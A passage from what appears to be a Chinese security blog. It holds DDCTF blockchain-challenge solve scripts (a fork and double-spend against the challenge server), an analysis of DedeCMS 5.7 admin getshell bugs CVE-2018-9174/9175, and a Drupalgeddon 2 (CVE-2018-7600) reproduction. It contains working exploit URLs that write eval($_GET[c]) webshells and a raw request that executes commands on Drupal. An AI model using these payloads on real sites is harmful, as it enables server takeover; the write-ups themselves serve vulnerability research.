class="string">"c4a5cb163786cc944c488df9c8a5143356aecc87a8854c76fbb76f5715b947d7be5ddcc9c69d46b904a857ee9437c71b"</span></span><br><span class="line"><span class="comment">## 创世块的hash</span></span><br><span class="line">prev_block_hash = <span class="string">"4d328ade1b2fcded980a568e8c42e0c05fb9001f6977d9f6fe219e242f3a6805"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 空块</span></span><br><span class="line">print(<span class="string">"empty block 1"</span>)</span><br><span class="line">block1 = empty_block(<span class="string">"empty block"</span>,prev_block_hash)</span><br><span class="line">block1 = pow(block1, btc.DIFFICULTY)</span><br><span class="line">myprint(block1)</span><br><span class="line">send_to_server(block1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 空块</span></span><br><span class="line">print(<span class="string">"empty block 2"</span>)</span><br><span class="line">block2 = empty_block(<span class="string">"empty block"</span>,block1[<span class="string">'hash'</span>])</span><br><span class="line">block2 = pow(block2, btc.DIFFICULTY)</span><br><span class="line">myprint(block2)</span><br><span class="line">send_to_server(block2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 空块</span></span><br><span class="line">print(<span class="string">"empty block 3"</span>)</span><br><span class="line">block3 = empty_block(<span class="string">"empty block"</span>,block2[<span class="string">'hash'</span>])</span><br><span class="line">block3 = pow(block3, btc.DIFFICULTY)</span><br><span class="line">myprint(block3)</span><br><span class="line">send_to_server(block3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 长度超过原链</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发后门，银行转币到商店</span></span><br><span class="line">print(<span class="string">"hit backdoor"</span>)</span><br><span class="line">backdoor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 商店转走币，给你一颗钻石（这需要一次创建块才能触发，我们在分叉2中触发就OK）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 空块</span></span><br><span class="line">print(<span class="string">"empty block 4, you will receive a diamond"</span>)</span><br><span class="line">block4 = empty_block(<span class="string">"empty block"</span>,block3[<span class="string">'hash'</span>])</span><br><span class="line">block4 = pow(block4, btc.DIFFICULTY)</span><br><span class="line">myprint(block4)</span><br><span class="line">send_to_server(block4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 空块</span></span><br><span class="line">print(<span class="string">"empty block 5"</span>)</span><br><span class="line">block5 = empty_block(<span class="string">"empty block"</span>,block4[<span class="string">'hash'</span>])</span><br><span class="line">block5 = pow(block5, btc.DIFFICULTY)</span><br><span class="line">myprint(block5)</span><br><span class="line">send_to_server(block5)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 空块</span></span><br><span class="line">print(<span class="string">"empty block 6"</span>)</span><br><span class="line">block6 = empty_block(<span class="string">"empty block"</span>,block5[<span class="string">'hash'</span>])</span><br><span class="line">block6 = pow(block6, btc.DIFFICULTY)</span><br><span class="line">myprint(block6)</span><br><span class="line">send_to_server(block6)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发后门，银行转币到商店</span></span><br><span class="line">print(<span class="string">"hit backdoor 2"</span>)</span><br><span class="line">backdoor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空块，触发商店转走币，给你一颗钻石</span></span><br><span class="line">print(<span class="string">"empty block 7"</span>)</span><br><span class="line">block7 = empty_block(<span class="string">"empty block"</span>,block6[<span class="string">'hash'</span>])</span><br><span class="line">block7 = pow(block7, btc.DIFFICULTY)</span><br><span class="line">myprint(block7)</span><br><span class="line">send_to_server(block7)</span><br><span class="line"></span><br><span class="line">r = ss.get(url_prefix + <span class="string">"/flag"</span>,proxies=proxies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure><p><img src="/img/ddctf/1524457763.png" alt=""></p><h4 id="不利用后门"><a href="#不利用后门" class="headerlink" title="不利用后门"></a>不利用后门</h4><p><img src="/img/ddctf/1524459681.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> btc</span><br><span class="line"><span class="keyword">import</span> rsa, uuid, json, copy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">genesis_block = <span class="string">"f91baf7a24ab07a0361e27e8527ec951feecc8cd4a67ef75e45059cf09dcdf76"</span></span><br><span class="line">hacker_input = <span class="string">"08e90dc1-2545-43fd-8ee4-c02b87d92899"</span></span><br><span class="line">hacker_signature = <span class="string">"5415d3901c9e497344e62aa7515d64e79ab5ef1d77556187b22f7c3909555f38579f39b2a07e6d84addd40eebdc55757"</span></span><br><span class="line">shop_address = <span class="string">"c4a5cb163786cc944c488df9c8a5143356aecc87a8854c76fbb76f5715b947d7be5ddcc9c69d46b904a857ee9437c71b"</span></span><br><span class="line"></span><br><span class="line">txout_id = str(uuid.uuid4())</span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">url_prefix = <span class="string">"http://localhost:5000/b9af31f66147e"</span></span><br><span class="line">ss = requests.session()</span><br><span class="line">ss.cookies.set(<span class="string">"session"</span>,<span class="string">".eJzNVtuK20gU_JXFz_PQrcvYDuyDjWwjk26hcctK9xKCbpbUkjzD2BNZCvPvWz25bTxhYWGzrMDogtynuk5VHX2apO191pwmbz5NKKFTJ6e3lpsRu8imNk1ca55T256RWTIlc8eeUTpz7flhmsyy1KK3Bc1vp3mWZ_aBZGaNKjlV5vxbOnkzYWJx4eNdw4QceMx6Zu01H9lFimgI4vDCRuYwr6r4uHC5h2uxcrhgrtJ5FWx4zfTKUmLdcJ030rrTzJK97H__ffJ8M6mKuqzOkzfWzeR4f8yKb0Xlbtmm75ak2C3rdDPXyZc_PDwWH78j000fbCRlne8GBt247oCQSLGuVMwbJVY208uaj0AnGpeNkaNEA3RbrUREuBVegKxmG95yIFObu1otPhc6PybHU5Kd6_sjaP3jPR5ZczI7uFY6n99aU3pwMyehSZHlBZ1aJJ3OEnc-t91ZMZ-5Vla4zjSnBU1JVhhu8zR_zewvxP-VWXrN7G619sNdX-52y6XYLaPdKirDZh3shmUgaFa9Ylnp5iI7ILNWA9-gmpdXzGMWi6OBWxHQ-LaKmcvFulPxXsux0sq7q9DvVumMKhFS5kWuRN-D2KCUNi9_yvI1P90dFMRIIO5qrkuLi7zjXjOAFwokDfeykVv7Sgog1JHLu3XFRihS85rH_iA1UG2MEhuqOlx3oc2_CKk-PjydX0p-LuVVbSCWjRxXZ6ZB7Y4QZqnmrahabOAsxwWWK22F8oHXuJPn9zeT-6fz10WSPH_8hjvwsp53hh3sebxrpd5WgbeiTIQj3AD8Le4byj2_Z2ILh8gLekn4qCq4xwVWm40rJxBsAFsDrnv0G87jneokkbqB4zKbecsKwLC_zJHjFhoJKXQymv0l3f3TEdjmL8fNj8Qqb98ytI3rkKgXkrddEENsncJzNkod2rC2wy02SNgZ7ID4lSvjbcu90uEb2BhChCxaLqQhmcgvLa3zvygnvEiLoyfROfAWhNeEIBFakKrRm3MQIy3GJZSCdNFtPXl-vrmmUuwhb6VlDHF1_qB0iZCRVI55A4u0MmYDQz9kt234xh9AMeFe6AQbf8Q7CKWwh0BHFvNa6ZWjvBbPTCC9SIrwzqcmsAIP64I-heCSFiPYHWqtfqCSXrEYGFGPygSaxUa_N5hYB4Y2aLtoLBWvejBjqQ621aqFJC0eGwmENot91Nw2L-Eqqk6JJWhCzcUrFpmIkAJQTyfPsmOOMtIE3LdoRuD5ZxmHoKN0mc471oUELEKbp7o8Juenx-K7xrG_i6kfoKYcW3SygcygAESPRPc5bKU8ifsMnfapiuVFQWZcRBYTpS214T_XwNkHIqI8liM4gFJwNnYTC1sJ1QQwP6II9ly2Kt7CU3h3jGx45tnk6GFO0wTDx3KSlEwTYt_SwpoWSM1pkc1deiiKLJtluZPcTovD1C0cl7jz7EDmyNHD9PZVjv7KhPqao-Q6R_ebqvXXdw9pvB99bzG-JQ9VWs-gxoXrr_i9jF2t4ssptf0ytZxSHrcPaXfCtSwzjNDUcht_s62S-PIxfxeWqpsP5h7v_GTSeYv-X__9fNJdc-uVaLrsmcZZ-K4SJTHZBFHA29vKyJ97Rtwc-WMEsED--hdk4Mg2mE-6hch9UxFxsUKAIlzLHzP476L0_-R_8nLcXA8piVDz4QI2YILUDK4BIkPEoLwthBgNbMN6rhszDvAptYdNEdadCXhJsTczoLArgy7qAw8fVK-z9J8PqOsUMObDmmVxLE716cPLF-OH_8xHw_3T44e8BpfHHDIjz38CpAVruA.Db75Tw.QeSMoxmB0xyGIo4lNdIZIxxJbXw"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = ss.get(url=url_prefix+<span class="string">"/"</span>,proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#工作量证明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">(b, difficulty, msg=<span class="string">""</span>)</span>:</span></span><br><span class="line">    nonce = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> nonce&lt;(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        b[<span class="string">'nonce'</span>] = msg+str(nonce)</span><br><span class="line">        b[<span class="string">'hash'</span>] = btc.hash_block(b)</span><br><span class="line">        block_hash = int(b[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> block_hash &lt; difficulty:</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        nonce+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造一个空块</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">empty_block</span><span class="params">(msg, prevHash)</span>:</span></span><br><span class="line">    b=&#123;&#125;</span><br><span class="line">    b[<span class="string">"prev"</span>] = prevHash</span><br><span class="line">    b[<span class="string">"transactions"</span>] = []</span><br><span class="line">    b = pow(b, btc.DIFFICULTY, msg)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myprint</span><span class="params">(b)</span>:</span></span><br><span class="line">    print(json.dumps(b))</span><br><span class="line">    print(len(json.dumps(b)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_to_server</span><span class="params">(b)</span>:</span></span><br><span class="line">    data = json.dumps(b)</span><br><span class="line">    r = ss.post(url = url_prefix+<span class="string">"/create_transaction"</span>,data = data, headers = &#123;<span class="string">"content-type"</span>:<span class="string">"application/json"</span>&#125;,proxies = proxies)</span><br><span class="line">    <span class="keyword">print</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从创世块开始就不承认，构造更长的链，不承认黑客已经转走钱，直接转给商店</span></span><br><span class="line"><span class="comment"># 从银行直接转币到商店</span></span><br><span class="line">print(<span class="string">"从银行直接转币到商店"</span>)</span><br><span class="line">block1 = &#123;&#125;</span><br><span class="line">block1[<span class="string">"prev"</span>] = genesis_block</span><br><span class="line">tx = &#123;<span class="string">"input"</span>:[hacker_input],<span class="string">"output"</span>:[&#123;<span class="string">"amount"</span>:<span class="number">1000000</span>, <span class="string">'id'</span>:txout_id,<span class="string">'addr'</span>:shop_address&#125;],<span class="string">'signature'</span>:[hacker_signature]&#125;</span><br><span class="line">tx[<span class="string">"output"</span>][<span class="number">0</span>][<span class="string">"hash"</span>] = btc.hash_utxo(tx[<span class="string">"output"</span>][<span class="number">0</span>])</span><br><span class="line">tx[<span class="string">'hash'</span>] = btc.hash_tx(tx)</span><br><span class="line">block1[<span class="string">"transactions"</span>] = [tx]</span><br><span class="line">block1 = pow(block1, btc.DIFFICULTY)</span><br><span class="line">myprint(block1)</span><br><span class="line">send_to_server(block1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造空块增加分叉链长度，使分叉链最长</span></span><br><span class="line"><span class="comment"># 空区块</span></span><br><span class="line">print(<span class="string">"空区块"</span>)</span><br><span class="line">block2 = empty_block(<span class="string">"myempty1"</span>, block1[<span class="string">"hash"</span>])</span><br><span class="line">myprint(block2)</span><br><span class="line">send_to_server(block2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空区块，触发下面的转走币</span></span><br><span class="line">print(<span class="string">"创建空区块，触发下面的转走币"</span>)</span><br><span class="line">block3 = empty_block(<span class="string">"myempty2"</span>, block2[<span class="string">"hash"</span>])</span><br><span class="line">myprint(block3)</span><br><span class="line">send_to_server(block3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 商店自动转走币</span></span><br><span class="line"><span class="comment"># 钻石+１</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不承认被转走了钱，即系统转走钱之前的那个块再次分叉，添加空块</span></span><br><span class="line"><span class="comment"># 创建空区块，</span></span><br><span class="line">print(<span class="string">"空区块"</span>)</span><br><span class="line">block4 = empty_block(<span class="string">"myempty3"</span>, block3[<span class="string">"hash"</span>])</span><br><span class="line">myprint(block4)</span><br><span class="line">send_to_server(block4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空区块，触发分叉2商店转走币</span></span><br><span class="line">print(<span class="string">"创建空区块，触发分叉2商店转走币"</span>)</span><br><span class="line">block5 = empty_block(<span class="string">"myempty4"</span>, block4[<span class="string">"hash"</span>])</span><br><span class="line">myprint(block5)</span><br><span class="line">send_to_server(block5)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分叉2商店转走币</span></span><br><span class="line"><span class="comment"># 钻石+１</span></span><br><span class="line"></span><br><span class="line">r = ss.get(url_prefix + <span class="string">"/flag"</span>,proxies=proxies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure><p><img src="/img/ddctf/1524459715.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DedeCMS5.7后台两处getshell(cve-2018-9174和cve-2018-9175)</title>
      <link href="//blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell-cve-2018-9174%E5%92%8Ccve-2018-9075.html"/>
      <url>//blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell-cve-2018-9174%E5%92%8Ccve-2018-9075.html</url>
      
        <content type="html"><![CDATA[<h3 id="第一处-cve-2018-9174"><a href="#第一处-cve-2018-9174" class="headerlink" title="第一处(cve-2018-9174)"></a>第一处(cve-2018-9174)</h3><p>基本原理是语句写入 inc 文件中，然后包含进来。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先，我们需要找到一个写文件的地方，我的理解 inc 文件是对<code>include file</code> 的缩写，所以如果能够控制写入的这个文件内容，一般能够找到include它的地方。</p><p><img src="/img/dedecms/1.png" alt=""></p><p>跟进去文件，uploads/dede/sys_verifies.php</p><p><img src="/img/dedecms/2.png" alt=""></p><p>这里我们就要想办法往里写php代码，看到输出点有双引号包围，需要闭合。</p><p>知道dedecms有个全局注册变量，</p><p>uploads\include\common.inc.php</p><p><img src="/img/dedecms/3.png" alt=""></p><p>其中会将字符串里面的<code>&quot;</code> 替换为<code>\&quot;</code>。</p><p>所以，我们可以构造</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/dede/sys_verifies.php?action=getfiles&amp;refiles[]=12%22;eval($_GET[c]);die();//</span><br></pre></td></tr></table></figure><p>到达substr那里</p><p><code>12\&quot;;eval($_GET[c]);die();//</code></p><p>截取为</p><p><code>&quot;;eval($_GET[c]);die();//</code></p><p>最终写入文件</p><p>\uploads\data\modifytmp.inc</p><p><img src="/img/dedecms/4.png" alt=""></p><p>任意找到一个<code>include</code> 该<code>modifytmp.inc</code>文件的地方。</p><p>原来那文件就有调用。</p><p>/uploads/dede/sys_verifies.php</p><p><img src="/img/dedecms/5.png" alt=""></p><p>所以，可以直接访问shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/dede/sys_verifies.php?action=down&amp;c=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/img/dedecms/6.png" alt=""></p><p>这种利用方法是<a href="https://xz.aliyun.com/t/2237" target="_blank" rel="noopener">https://xz.aliyun.com/t/2237</a>中介绍的，利用了<code>substr</code></p><p>OK，容易找到另外的利用方式。</p><p><img src="/img/dedecms/7.png" alt=""></p><p>注意到是双引号闭合。</p><p>Great！</p><p>我们不用闭合双引号，可以用可变变量来达到代码执行。</p><p>访问如下链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/dede/sys_verifies.php?action=getfiles&amp;refiles[]=123$&#123;$&#123;eval($_GET[c])&#125;&#125;</span><br></pre></td></tr></table></figure><p>写入的文件如下</p><p><img src="/img/dedecms/8.png" alt=""></p><p>访问如下链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/dede/sys_verifies.php?action=down&amp;c=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/img/dedecms/9.png" alt=""></p><h4 id="POC-EXP"><a href="#POC-EXP" class="headerlink" title="POC/EXP"></a>POC/EXP</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><ul><li><p>登录后台</p></li><li><p>访问</p><blockquote><p><a href="http://mydedecms.com/dede/sys_verifies.php?action=getfiles&amp;refiles[]=12%22;eval($_GET[c]);die();//" target="_blank" rel="noopener">http://mydedecms.com/dede/sys_verifies.php?action=getfiles&amp;refiles[]=12%22;eval($_GET[c]);die();//</a></p></blockquote></li><li>访问<blockquote><p><a href="http://mydedecms.com/dede/sys_verifies.php?action=down&amp;c=phpinfo(" target="_blank" rel="noopener">http://mydedecms.com/dede/sys_verifies.php?action=down&amp;c=phpinfo(</a>);</p></blockquote></li></ul><p>看到执行了phpinfo()</p><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><ul><li>登录后台</li><li>访问<blockquote><p><a href="http://mydedecms.com/dede/sys_verifies.php?action=getfiles&amp;refiles[]=123${${eval($_GET[c])}}" target="_blank" rel="noopener">http://mydedecms.com/dede/sys_verifies.php?action=getfiles&amp;refiles[]=123${${eval($_GET[c])}}</a></p></blockquote></li><li>访问<blockquote><p><a href="http://mydedecms.com/dede/sys_verifies.php?action=down&amp;c=phpinfo(" target="_blank" rel="noopener">http://mydedecms.com/dede/sys_verifies.php?action=down&amp;c=phpinfo(</a>);</p></blockquote></li></ul><h3 id="第二处-cve-2018-9175"><a href="#第二处-cve-2018-9175" class="headerlink" title="第二处(cve-2018-9175)"></a>第二处(cve-2018-9175)</h3><p>基本原理是语句写入数据库，从数据库中取值，输出到 php文件中。</p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>\uploads\dede\sys_cache_up.php</p><p><img src="/img/dedecms/10.png" alt=""></p><p>跟进去</p><p><img src="/img/dedecms/11.png" alt=""></p><p>直接从数据库中取数据后写入到文件中。</p><p>找到一个写入该数据表的地方</p><p>/uploads/dede/stepselect_main.php</p><p><img src="/img/dedecms/12.png" alt=""></p><p>OK，有意思的是，插入数据库后，底下就执行了更新缓存，所以，插入数据库和写入缓存文件可以通过访问一个链接达到，构造访问如下链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/dede/stepselect_main.php?action=addenum_save&amp;ename=2334&amp;egroup=;phpinfo();$&amp;issign=1</span><br></pre></td></tr></table></figure><p>此时向数据库中添加了数据</p><p><img src="/img/dedecms/13.png" alt=""></p><p>此时，缓存文件</p><p>uploads/data/enums/;phpinfo();$.php</p><p><img src="/img/dedecms/14.png" alt=""></p><p>然后，访问之，链接为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/data/enums/;phpinfo();$.php</span><br></pre></td></tr></table></figure><p><img src="/img/dedecms/15.png" alt=""></p><h4 id="POC-EXP-1"><a href="#POC-EXP-1" class="headerlink" title="POC/EXP"></a>POC/EXP</h4><h5 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h5><ul><li>登录后台</li><li><p>访问链接写入数据库，写入缓存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/dede/stepselect_main.php?action=addenum_save&amp;ename=2334&amp;egroup=;phpinfo();$&amp;issign=1</span><br></pre></td></tr></table></figure></li><li><p>访问缓存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/data/enums/;phpinfo();$.php</span><br></pre></td></tr></table></figure></li></ul><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><ul><li>登录后台</li><li><p>访问链接写入数据库，写入缓存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/dede/stepselect_main.php?action=addenum_save&amp;ename=2334&amp;egroup=;eval($_GET[c]);$&amp;issign=1</span><br></pre></td></tr></table></figure></li><li><p>访问缓存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mydedecms.com/data/enums/;eval($_GET[c]);$.php?c=phpinfo();</span><br></pre></td></tr></table></figure></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9175" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9175</a></p><p><a href="https://xz.aliyun.com/t/2237" target="_blank" rel="noopener">https://xz.aliyun.com/t/2237</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Drupal-Drupalgeddon-2-远程代码执行漏洞复现分析(CVE-2018-7600)</title>
      <link href="//blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90-CVE-2018-7600.html"/>
      <url>//blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90-CVE-2018-7600.html</url>
      
        <content type="html"><![CDATA[<h2 id="版本-drupal-8-5-0"><a href="#版本-drupal-8-5-0" class="headerlink" title="版本: drupal 8.5.0"></a>版本: drupal 8.5.0</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600</a></p><p>docker一键搭建</p><p><strong>版本: drupal 8.5.0</strong></p><p>搭建完后，访问<code>http://yourip:8080</code> 一路默认安装，数据库选sqlite。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: yourip:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span><br></pre></td></tr></table></figure><p><img src="/img/drupal/1.png" alt=""></p><p>看到成功执行命令<code>id</code></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>为了便于分析，给docker里面装上xdebug，由于是内网，再加上端口转发来进行远程调试。</p><p>注意关键点为<code>X-Forwarded-For: your vps ip</code> 。</p><h5 id="漏洞分析环境配置"><a href="#漏洞分析环境配置" class="headerlink" title="漏洞分析环境配置"></a>漏洞分析环境配置</h5><p>（此配置较通用，与分析无关，可跳过）</p><p><code>sudo docker exec -it your_container_id /bin/bash</code></p><p>然后，常规操作，这是后面写的大概流程，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://xdebug.org/files/xdebug-2.6.0.tgz</span><br><span class="line">tar zxvf xdebug-2.6.0.tgz</span><br><span class="line">cd xdebug-2.6.0</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>然后，找不到php.ini，查看<code>phpinfo</code> 页面发现并没有加载这么个文件，github上找对应版本的<code>php.ini-development</code> 复制到指定目录下(这里可以通过phpinfo页面看到)，重命名为<code>php.ini</code>。在这个docker里，目录是在<code>/usr/local/etc/php</code></p><p>添加xdebug的配置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20170718/xdebug.so</span><br><span class="line">xdebug.auto_trace = On</span><br><span class="line">xdebug.show_execption_trace = On</span><br><span class="line">xdebug.show_local_vars = On</span><br><span class="line">xdebug.remote_autostart = On</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">xdebug.remote_connect_back = 1</span><br><span class="line">xdebug.collect_vars = 